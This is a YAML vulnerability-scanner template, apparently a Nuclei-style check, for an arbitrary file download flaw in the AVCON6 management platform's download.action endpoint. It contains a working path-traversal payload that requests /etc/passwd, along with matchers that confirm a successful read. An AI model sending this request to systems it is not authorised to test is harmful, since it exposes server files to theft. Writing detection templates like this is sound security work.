id: "avcon6-lfi"
name: "AVCON6 - Arbitrary File Download"
severity: "high"
description: "File Download vulnerability in the download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server"
tech:
  - "generic"
tags:
  - "avcon6"
  - "lfi"
  - "vuln"
reference: "https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/AVCON6%20%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
spaExclusion: true
request:
  method: "GET"
  path: "/download.action?filename=../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "word"
    part: "header"
    words:
      - "application/octet-stream"
      - "filename="
    condition: "and"
  - type: "status"
    status:
      - 200
